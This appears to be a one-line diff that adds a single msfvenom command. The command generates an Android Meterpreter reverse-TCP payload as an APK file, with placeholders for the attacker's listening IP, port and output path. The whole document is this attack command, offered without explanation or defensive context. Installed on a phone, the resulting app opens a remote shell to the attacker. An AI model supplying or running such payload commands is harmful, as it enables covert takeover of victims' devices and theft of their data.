@@ -1,0 +1,1 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -o /path/to/output.apk
